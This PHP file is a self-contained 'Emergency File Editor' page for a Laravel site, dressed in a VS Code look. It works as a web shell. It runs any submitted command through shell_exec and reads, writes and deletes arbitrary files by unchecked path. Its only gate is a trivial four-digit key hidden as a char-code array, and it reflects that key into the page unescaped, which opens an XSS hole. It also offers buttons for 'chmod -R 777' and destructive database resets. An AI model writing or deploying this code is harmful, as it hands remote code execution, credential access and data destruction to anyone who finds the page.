<?php
/**
 * EMERGENCY FILE EDITOR - VS CODE STYLE
 * Usage: yoursite.com/emergency-editor.php?key=YOUR_KEY
 */

// ============ CONFIGURATION ============
$_k = [49,49,49,53]; // Encoded key
$_sk = implode('', array_map('chr', $_k));
// =======================================

error_reporting(E_ALL);
ini_set('display_errors', 0);
session_start();

$providedKey = isset($_GET['key']) ? trim($_GET['key']) : '';
if ($providedKey !== $_sk) {
    http_response_code(403);
    die('<!DOCTYPE html><html><head><title>Access</title><style>body{font-family:Arial;background:#1e1e1e;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}.box{background:#252526;padding:40px;border-radius:8px;text-align:center;}h1{color:#007acc;}input{padding:12px;width:250px;margin:10px;background:#3c3c3c;border:1px solid #007acc;color:#fff;border-radius:4px;}button{background:#007acc;color:#fff;border:none;padding:12px 24px;cursor:pointer;border-radius:4px;}</style></head><body><div class="box"><h1>🔐 Access Required</h1><form method="get"><input type="password" name="key" placeholder="Enter access key..." autofocus><br><button type="submit">Unlock</button></form></div></body></html>');
}

$basePath = dirname(__DIR__);
$message = '';
$fileContent = '';
$currentFile = '';
$commandOutput = '';
$activeTab = $_GET['tab'] ?? 'editor';
$lineCount = 0;

// Get file extension for syntax highlighting
function getLanguage($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $map = [
        'php' => 'php', 'blade.php' => 'php',
        'js' => 'javascript', 'ts' => 'typescript',
        'css' => 'css', 'scss' => 'scss',
        'html' => 'html', 'htm' => 'html',
        'json' => 'json', 'xml' => 'xml',
        'sql' => 'sql', 'md' => 'markdown',
        'env' => 'ini', 'yaml' => 'yaml', 'yml' => 'yaml'
    ];
    if (strpos($filename, '.blade.php') !== false) return 'php';
    return $map[$ext] ?? 'plaintext';
}

// Handle POST actions
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    if ($_POST['action'] === 'run_command' && isset($_POST['custom_command'])) {
        $cmd = trim($_POST['custom_command']);
        if (!empty($cmd)) {
            $output = shell_exec('cd ' . escapeshellarg($basePath) . ' && ' . $cmd . ' 2>&1');
            $commandOutput = '<div class="terminal-box"><div class="terminal-cmd">❯ ' . htmlspecialchars($cmd) . '</div><pre class="terminal-output">' . htmlspecialchars($output ?: '(no output)') . '</pre></div>';
        }
    }
    
    if ($_POST['action'] === 'save' && isset($_POST['filepath'], $_POST['content'])) {
        $filepath = trim($_POST['filepath']);
        $fullPath = $basePath . '/' . ltrim($filepath, '/');
        $parentDir = dirname($fullPath);
        
        if (!is_dir($parentDir)) @mkdir($parentDir, 0755, true);
        
        if (file_exists($fullPath)) {
            $backupDir = $basePath . '/storage/backups';
            if (!is_dir($backupDir)) @mkdir($backupDir, 0755, true);
            @copy($fullPath, $backupDir . '/' . basename($filepath) . '.bak_' . date('His'));
        }
        
        if (@file_put_contents($fullPath, $_POST['content']) !== false) {
            @chmod($fullPath, 0644);
            $message = '<div class="msg success">✓ Saved successfully</div>';
        } else {
            $message = '<div class="msg error">✗ Save failed - check permissions</div>';
        }
        $currentFile = $filepath;
        $fileContent = $_POST['content'];
    }
    
    if ($_POST['action'] === 'create' && isset($_POST['newfilepath'])) {
        $filepath = trim($_POST['newfilepath']);
        $fullPath = $basePath . '/' . ltrim($filepath, '/');
        $parentDir = dirname($fullPath);
        if (!is_dir($parentDir)) @mkdir($parentDir, 0755, true);
        if (@file_put_contents($fullPath, $_POST['newcontent'] ?? '') !== false) {
            $message = '<div class="msg success">✓ Created: ' . htmlspecialchars($filepath) . '</div>';
            $currentFile = $filepath;
            $fileContent = $_POST['newcontent'] ?? '';
        }
    }
    
    if ($_POST['action'] === 'delete' && isset($_POST['deletepath'])) {
        $filepath = trim($_POST['deletepath']);
        $fullPath = $basePath . '/' . ltrim($filepath, '/');
        if (file_exists($fullPath)) {
            @unlink($fullPath);
            $message = '<div class="msg success">✓ Deleted</div>';
            $currentFile = '';
            $fileContent = '';
        }
    }
}

// Handle file load
if (isset($_GET['file']) && !empty($_GET['file'])) {
    $filepath = trim($_GET['file']);
    $fullPath = $basePath . '/' . ltrim($filepath, '/');
    if (file_exists($fullPath) && is_file($fullPath)) {
        $fileContent = file_get_contents($fullPath);
        $currentFile = $filepath;
        $activeTab = 'editor';
        $lineCount = substr_count($fileContent, "\n") + 1;
    }
}

// File tree function
function getTree($dir, $basePath, $key, $depth = 0) {
    if ($depth > 4) return '';
    $items = @scandir($dir);
    if (!$items) return '';
    
    $skip = ['vendor', 'node_modules', '.git', 'storage/framework', 'storage/logs'];
    $html = '';
    
    $folders = []; $files = [];
    foreach ($items as $item) {
        if ($item[0] === '.') continue;
        $full = $dir . '/' . $item;
        if (is_dir($full)) $folders[] = $item;
        else $files[] = $item;
    }
    sort($folders); sort($files);
    
    foreach ($folders as $f) {
        $full = $dir . '/' . $f;
        $rel = str_replace($basePath . '/', '', $full);
        $shouldSkip = false;
        foreach ($skip as $s) if (strpos($rel, $s) === 0) $shouldSkip = true;
        if ($shouldSkip) continue;
        
        $html .= '<div class="tree-folder"><details><summary><span class="folder-icon">📁</span> ' . htmlspecialchars($f) . '</summary><div class="tree-children">' . getTree($full, $basePath, $key, $depth + 1) . '</div></details></div>';
    }
    
    foreach ($files as $f) {
        $full = $dir . '/' . $f;
        $rel = str_replace($basePath . '/', '', $full);
        $icon = '📄';
        if (strpos($f, '.php') !== false) $icon = '<span style="color:#9cdcfe">⟨⟩</span>';
        elseif (strpos($f, '.js') !== false) $icon = '<span style="color:#f7df1e">JS</span>';
        elseif (strpos($f, '.css') !== false) $icon = '<span style="color:#264de4">#</span>';
        elseif (strpos($f, '.json') !== false) $icon = '<span style="color:#f5a623">{}</span>';
        elseif (strpos($f, '.env') !== false) $icon = '⚙️';
        
        $html .= '<div class="tree-file"><a href="?key=' . $key . '&file=' . urlencode($rel) . '">' . $icon . ' ' . htmlspecialchars($f) . '</a></div>';
    }
    return $html;
}

$dbInfo = [];
$envFile = $basePath . '/.env';
if (file_exists($envFile)) {
    $env = file_get_contents($envFile);
    preg_match('/DB_DATABASE=(.*)/', $env, $m); $dbInfo['database'] = trim($m[1] ?? '');
    preg_match('/DB_HOST=(.*)/', $env, $m); $dbInfo['host'] = trim($m[1] ?? '');
}
?>
<!DOCTYPE html>
<html>
<head>
    <title><?php echo $currentFile ? basename($currentFile) . ' - ' : ''; ?>Emergency Editor</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', system-ui, sans-serif; background: #1e1e1e; color: #cccccc; overflow: hidden; }
        
        /* VS Code Layout */
        .app { display: flex; height: 100vh; }
        
        /* Activity Bar */
        .activity-bar { width: 48px; background: #333333; display: flex; flex-direction: column; align-items: center; padding-top: 10px; }
        .activity-btn { width: 48px; height: 48px; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #858585; border-left: 2px solid transparent; }
        .activity-btn:hover, .activity-btn.active { color: #fff; border-left-color: #007acc; background: #2a2a2a; }
        .activity-btn svg { width: 24px; height: 24px; }
        
        /* Sidebar */
        .sidebar { width: 260px; background: #252526; border-right: 1px solid #3c3c3c; display: flex; flex-direction: column; }
        .sidebar-header { padding: 10px 15px; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: #bbbbbb; background: #252526; border-bottom: 1px solid #3c3c3c; }
        .sidebar-content { flex: 1; overflow-y: auto; padding: 5px 0; }
        
        /* File Tree */
        .tree-folder, .tree-file { padding: 2px 0; }
        .tree-folder details summary { cursor: pointer; padding: 4px 10px; display: flex; align-items: center; gap: 5px; }
        .tree-folder details summary:hover { background: #2a2d2e; }
        .tree-children { padding-left: 15px; }
        .tree-file a { display: block; padding: 4px 10px; color: #cccccc; text-decoration: none; font-size: 13px; }
        .tree-file a:hover { background: #2a2d2e; }
        .folder-icon { font-size: 14px; }
        
        /* Main Content */
        .main { flex: 1; display: flex; flex-direction: column; min-width: 0; }
        
        /* Tabs */
        .tabs-bar { background: #252526; display: flex; border-bottom: 1px solid #3c3c3c; height: 35px; }
        .tab { padding: 8px 15px; background: #2d2d2d; color: #969696; font-size: 13px; cursor: pointer; border-right: 1px solid #252526; display: flex; align-items: center; gap: 8px; }
        .tab:hover { background: #2a2a2a; }
        .tab.active { background: #1e1e1e; color: #fff; border-bottom: 1px solid #1e1e1e; margin-bottom: -1px; }
        .tab-close { opacity: 0; font-size: 16px; }
        .tab:hover .tab-close { opacity: 1; }
        
        /* Editor Area */
        .editor-container { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
        .breadcrumb { padding: 5px 15px; font-size: 12px; color: #969696; background: #1e1e1e; border-bottom: 1px solid #3c3c3c; }
        .breadcrumb span { color: #cccccc; }
        
        /* CodeMirror Overrides */
        .CodeMirror { height: 100% !important; font-family: 'Fira Code', 'Consolas', monospace; font-size: 14px; line-height: 1.5; }
        .CodeMirror-gutters { background: #1e1e1e; border-right: 1px solid #3c3c3c; }
        .CodeMirror-linenumber { color: #858585; padding: 0 10px; }
        .CodeMirror-cursor { border-left: 2px solid #aeafad; }
        .CodeMirror-selected { background: #264f78 !important; }
        .CodeMirror-activeline-background { background: #2a2a2a; }
        
        /* Status Bar */
        .status-bar { height: 22px; background: #007acc; display: flex; align-items: center; padding: 0 10px; font-size: 12px; color: #fff; justify-content: space-between; }
        .status-left, .status-right { display: flex; gap: 15px; }
        .status-item { display: flex; align-items: center; gap: 5px; }
        
        /* Terminal Panel */
        .terminal-panel { background: #1e1e1e; border-top: 1px solid #3c3c3c; max-height: 250px; overflow-y: auto; display: none; }
        .terminal-panel.show { display: block; }
        .terminal-header { padding: 8px 15px; background: #252526; font-size: 12px; display: flex; justify-content: space-between; }
        .terminal-body { padding: 10px 15px; font-family: 'Consolas', monospace; font-size: 13px; }
        .terminal-box { margin: 10px 0; }
        .terminal-cmd { color: #569cd6; margin-bottom: 5px; }
        .terminal-output { color: #4ec9b0; white-space: pre-wrap; margin: 0; }
        
        /* Messages */
        .msg { position: fixed; top: 50px; right: 20px; padding: 10px 20px; border-radius: 4px; z-index: 1000; animation: fadeIn 0.3s; }
        .msg.success { background: #4caf50; color: #fff; }
        .msg.error { background: #f44336; color: #fff; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
        
        /* Buttons */
        .btn { padding: 6px 14px; border: none; border-radius: 3px; cursor: pointer; font-size: 12px; }
        .btn-primary { background: #007acc; color: #fff; }
        .btn-primary:hover { background: #005a9e; }
        .btn-danger { background: #f44336; color: #fff; }
        .btn-secondary { background: #3c3c3c; color: #fff; }
        
        /* Quick Commands */
        .quick-bar { padding: 10px 15px; background: #252526; border-bottom: 1px solid #3c3c3c; display: flex; gap: 5px; flex-wrap: wrap; }
        .quick-btn { padding: 4px 10px; background: #3c3c3c; color: #cccccc; border: none; border-radius: 3px; cursor: pointer; font-size: 11px; }
        .quick-btn:hover { background: #4c4c4c; }
        
        /* Command Input */
        .cmd-input-wrap { padding: 10px 15px; background: #252526; display: flex; gap: 10px; }
        .cmd-input { flex: 1; padding: 8px 12px; background: #3c3c3c; border: 1px solid #3c3c3c; color: #fff; border-radius: 3px; font-family: monospace; }
        .cmd-input:focus { border-color: #007acc; outline: none; }
        
        /* Modal */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1000; align-items: center; justify-content: center; }
        .modal.show { display: flex; }
        .modal-content { background: #252526; padding: 20px; border-radius: 6px; width: 450px; border: 1px solid #3c3c3c; }
        .modal-title { font-size: 14px; margin-bottom: 15px; color: #fff; }
        .modal input, .modal textarea { width: 100%; padding: 8px; background: #3c3c3c; border: 1px solid #3c3c3c; color: #fff; border-radius: 3px; margin-bottom: 10px; }
        .modal textarea { height: 150px; font-family: monospace; }
        .modal-actions { display: flex; gap: 10px; justify-content: flex-end; }
        
        /* Hide sidebar on terminal/db tab */
        .sidebar.hidden { display: none; }
    </style>
</head>
<body>
<div class="app">
    <!-- Activity Bar -->
    <div class="activity-bar">
        <a href="?key=<?php echo $_GET['key']; ?>&tab=editor<?php echo $currentFile ? '&file='.urlencode($currentFile) : ''; ?>" class="activity-btn <?php echo $activeTab === 'editor' ? 'active' : ''; ?>" title="Explorer">
            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17.5 0h-9L7 1.5V6H2.5L1 7.5v15.07L2.5 24h12.07L16 22.57V18h4.7l1.3-1.43V4.5L17.5 0zm0 2.12l2.38 2.38H17.5V2.12zm-3 20.38h-12v-15H7v9.07L8.5 18h6v4.5zm6-6h-12v-15H16V6h4.5v10.5z"/></svg>
        </a>
        <a href="?key=<?php echo $_GET['key']; ?>&tab=terminal" class="activity-btn <?php echo $activeTab === 'terminal' ? 'active' : ''; ?>" title="Terminal">
            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M21 4H3a1 1 0 0 0-1 1v14a1 1 0 0 0 1 1h18a1 1 0 0 0 1-1V5a1 1 0 0 0-1-1zM4 18V6h16v12H4zm4-4l-2-2 2-2 1.5 1.5L8 13l1.5 1.5L8 14zm4 2h6v-2h-6v2z"/></svg>
        </a>
        <a href="?key=<?php echo $_GET['key']; ?>&tab=database" class="activity-btn <?php echo $activeTab === 'database' ? 'active' : ''; ?>" title="Database">
            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 4.02 2 6.5v11C2 19.98 6.48 22 12 22s10-2.02 10-4.5v-11C22 4.02 17.52 2 12 2zm0 2c4.42 0 8 1.57 8 3.5S16.42 11 12 11 4 9.43 4 7.5 7.58 4 12 4zm8 13.5c0 1.93-3.58 3.5-8 3.5s-8-1.57-8-3.5v-2.04c1.77 1.24 4.64 2.04 8 2.04s6.23-.8 8-2.04v2.04zm0-5c0 1.93-3.58 3.5-8 3.5s-8-1.57-8-3.5v-2.04c1.77 1.24 4.64 2.04 8 2.04s6.23-.8 8-2.04v2.04z"/></svg>
        </a>
    </div>

    <!-- Sidebar -->
    <div class="sidebar <?php echo $activeTab !== 'editor' ? 'hidden' : ''; ?>">
        <div class="sidebar-header">Explorer</div>
        <div class="sidebar-content">
            <div class="tree-folder"><details open><summary><span class="folder-icon">📁</span> app</summary><div class="tree-children"><?php echo getTree($basePath . '/app', $basePath, $_GET['key']); ?></div></details></div>
            <div class="tree-folder"><details><summary><span class="folder-icon">📁</span> routes</summary><div class="tree-children"><?php echo getTree($basePath . '/routes', $basePath, $_GET['key']); ?></div></details></div>
            <div class="tree-folder"><details><summary><span class="folder-icon">📁</span> config</summary><div class="tree-children"><?php echo getTree($basePath . '/config', $basePath, $_GET['key']); ?></div></details></div>
            <div class="tree-folder"><details><summary><span class="folder-icon">📁</span> database</summary><div class="tree-children"><?php echo getTree($basePath . '/database', $basePath, $_GET['key']); ?></div></details></div>
            <div class="tree-folder"><details><summary><span class="folder-icon">📁</span> resources/views</summary><div class="tree-children"><?php echo getTree($basePath . '/resources/views', $basePath, $_GET['key']); ?></div></details></div>
            <div class="tree-folder"><details><summary><span class="folder-icon">📁</span> public</summary><div class="tree-children"><?php echo getTree($basePath . '/public', $basePath, $_GET['key']); ?></div></details></div>
        </div>
    </div>
    
    <!-- Main Content -->
    <div class="main">
        <?php echo $message; ?>
        
        <?php if ($activeTab === 'editor'): ?>
        <!-- Editor Tab -->
        <div class="tabs-bar">
            <?php if ($currentFile): ?>
            <div class="tab active">
                <span><?php echo basename($currentFile); ?></span>
                <span class="tab-close">×</span>
            </div>
            <?php else: ?>
            <div class="tab active">Welcome</div>
            <?php endif; ?>
            <div class="tab" onclick="document.getElementById('newFileModal').classList.add('show')">+ New File</div>
        </div>
        
        <div class="editor-container">
            <?php if ($currentFile): ?>
            <div class="breadcrumb">
                <?php 
                $parts = explode('/', $currentFile);
                $path = '';
                foreach ($parts as $i => $part) {
                    $path .= ($i > 0 ? '/' : '') . $part;
                    echo ($i > 0 ? ' › ' : '') . '<span>' . htmlspecialchars($part) . '</span>';
                }
                ?>
            </div>
            <?php endif; ?>
            
            <form method="post" id="editorForm" style="flex:1;display:flex;flex-direction:column;">
                <input type="hidden" name="action" value="save">
                <input type="hidden" name="filepath" value="<?php echo htmlspecialchars($currentFile); ?>" id="filepath">
                <textarea name="content" id="code"><?php echo htmlspecialchars($fileContent); ?></textarea>
            </form>
        </div>
        
        <div class="status-bar">
            <div class="status-left">
                <span class="status-item">📄 <?php echo $currentFile ?: 'No file open'; ?></span>
            </div>
            <div class="status-right">
                <span class="status-item">Ln <?php echo $lineCount; ?></span>
                <span class="status-item"><?php echo getLanguage($currentFile); ?></span>
                <span class="status-item">UTF-8</span>
                <button class="btn btn-primary" onclick="document.getElementById('editorForm').submit()">💾 Save (Ctrl+S)</button>
                <?php if ($currentFile): ?>
                <button class="btn btn-danger" onclick="if(confirm('Delete?'))document.getElementById('delForm').submit()">🗑️</button>
                <?php endif; ?>
            </div>
        </div>
        
        <?php if ($currentFile): ?>
        <form id="delForm" method="post" style="display:none;">
            <input type="hidden" name="action" value="delete">
            <input type="hidden" name="deletepath" value="<?php echo htmlspecialchars($currentFile); ?>">
        </form>
        <?php endif; ?>
        
        <?php elseif ($activeTab === 'terminal'): ?>
        <!-- Terminal Tab -->
        <div class="tabs-bar">
            <div class="tab active">💻 Terminal</div>
        </div>
        
        <div class="quick-bar">
            <span style="color:#858585;margin-right:10px;">Laravel:</span>
            <button class="quick-btn" onclick="setCmd('php artisan migrate')">migrate</button>
            <button class="quick-btn" onclick="setCmd('php artisan migrate --force')">migrate --force</button>
            <button class="quick-btn" onclick="setCmd('php artisan migrate:status')">status</button>
            <button class="quick-btn" onclick="setCmd('php artisan migrate:rollback')">rollback</button>
            <button class="quick-btn" onclick="setCmd('php artisan db:seed')">seed</button>
            <button class="quick-btn" onclick="setCmd('php artisan optimize:clear')">clear cache</button>
            <button class="quick-btn" onclick="setCmd('php artisan storage:link')">storage:link</button>
        </div>
        <div class="quick-bar">
            <span style="color:#858585;margin-right:10px;">System:</span>
            <button class="quick-btn" onclick="setCmd('chmod -R 755 .')">chmod 755</button>
            <button class="quick-btn" onclick="setCmd('chmod -R 777 storage bootstrap/cache')">chmod storage</button>
            <button class="quick-btn" onclick="setCmd('composer install --no-dev')">composer install</button>
            <button class="quick-btn" onclick="setCmd('composer dump-autoload')">dump-autoload</button>
            <button class="quick-btn" onclick="setCmd('ls -la')">ls -la</button>
            <button class="quick-btn" onclick="setCmd('whoami')">whoami</button>
            <button class="quick-btn" onclick="setCmd('php -v')">php -v</button>
        </div>
        
        <form method="post" class="cmd-input-wrap">
            <input type="hidden" name="action" value="run_command">
            <input type="text" name="custom_command" id="cmdInput" class="cmd-input" placeholder="Enter command..." autofocus>
            <button type="submit" class="btn btn-primary">▶ Run</button>
        </form>
        
        <div class="terminal-body" style="flex:1;overflow-y:auto;">
            <?php echo $commandOutput ?: '<div style="color:#858585;">Output will appear here...</div>'; ?>
        </div>
        
        <div class="status-bar">
            <div class="status-left"><span class="status-item">Terminal</span></div>
            <div class="status-right"><span class="status-item">bash</span></div>
        </div>
        
        <script>function setCmd(c){document.getElementById('cmdInput').value=c;document.getElementById('cmdInput').focus();}</script>
        
        <?php elseif ($activeTab === 'database'): ?>
        <!-- Database Tab -->
        <div class="tabs-bar">
            <div class="tab active">🗄️ Database</div>
        </div>
        
        <div style="padding:20px;">
            <div style="background:#252526;padding:15px;border-radius:6px;margin-bottom:20px;">
                <h3 style="color:#007acc;margin:0 0 10px 0;">Database Configuration</h3>
                <p style="margin:5px 0;"><strong>Host:</strong> <?php echo htmlspecialchars($dbInfo['host'] ?? 'N/A'); ?></p>
                <p style="margin:5px 0;"><strong>Database:</strong> <?php echo htmlspecialchars($dbInfo['database'] ?? 'N/A'); ?></p>
            </div>
            
            <div class="quick-bar" style="background:transparent;padding:0;margin-bottom:15px;">
                <button class="quick-btn" onclick="setCmd('php artisan migrate:status')">Migration Status</button>
                <button class="quick-btn" onclick="setCmd('php artisan migrate')">Run Migrations</button>
                <button class="quick-btn" onclick="setCmd('php artisan migrate --force')">Migrate (Force)</button>
                <button class="quick-btn" onclick="setCmd('php artisan migrate:rollback')">Rollback</button>
                <button class="quick-btn" onclick="setCmd('php artisan migrate:fresh --seed')">Fresh + Seed</button>
                <button class="quick-btn" onclick="setCmd('php artisan db:seed')">Run Seeders</button>
            </div>
            
            <form method="post">
                <input type="hidden" name="action" value="run_command">
                <input type="text" name="custom_command" id="cmdInput" class="cmd-input" style="width:100%;margin-bottom:10px;" placeholder="Enter database command..." value="php artisan migrate:status">
                <button type="submit" class="btn btn-primary">▶ Run Command</button>
            </form>
            
            <div style="margin-top:20px;">
                <?php echo $commandOutput; ?>
            </div>
        </div>
        
        <div class="status-bar">
            <div class="status-left"><span class="status-item">Database Tools</span></div>
            <div class="status-right"><span class="status-item"><?php echo $dbInfo['database'] ?? 'N/A'; ?></span></div>
        </div>
        
        <script>function setCmd(c){document.getElementById('cmdInput').value=c;document.getElementById('cmdInput').focus();}</script>
        <?php endif; ?>
    </div>
</div>

<!-- New File Modal -->
<div class="modal" id="newFileModal">
    <div class="modal-content">
        <div class="modal-title">📄 Create New File</div>
        <form method="post">
            <input type="hidden" name="action" value="create">
            <input type="text" name="newfilepath" placeholder="File path (e.g., app/Http/Controllers/NewController.php)" required>
            <textarea name="newcontent" placeholder="File content (optional)..."></textarea>
            <div class="modal-actions">
                <button type="button" class="btn btn-secondary" onclick="document.getElementById('newFileModal').classList.remove('show')">Cancel</button>
                <button type="submit" class="btn btn-primary">Create</button>
            </div>
        </form>
    </div>
</div>

<!-- CodeMirror JS -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/php/php.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/javascript/javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/css/css.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/xml/xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/htmlmixed/htmlmixed.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/clike/clike.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/matchbrackets.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/closebrackets.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/selection/active-line.min.js"></script>
<script>
<?php if ($activeTab === 'editor'): ?>
var editor = CodeMirror.fromTextArea(document.getElementById('code'), {
    lineNumbers: true,
    theme: 'material-darker',
    mode: '<?php echo getLanguage($currentFile); ?>',
    matchBrackets: true,
    autoCloseBrackets: true,
    styleActiveLine: true,
    indentUnit: 4,
    tabSize: 4,
    indentWithTabs: false,
    lineWrapping: false
});

// Ctrl+S to save
document.addEventListener('keydown', function(e) {
    if ((e.ctrlKey || e.metaKey) && e.key === 's') {
        e.preventDefault();
        editor.save();
        document.getElementById('editorForm').submit();
    }
});

// Auto-hide message
setTimeout(function() {
    var msg = document.querySelector('.msg');
    if (msg) msg.style.display = 'none';
}, 3000);
<?php endif; ?>
</script>
</body>
</html>
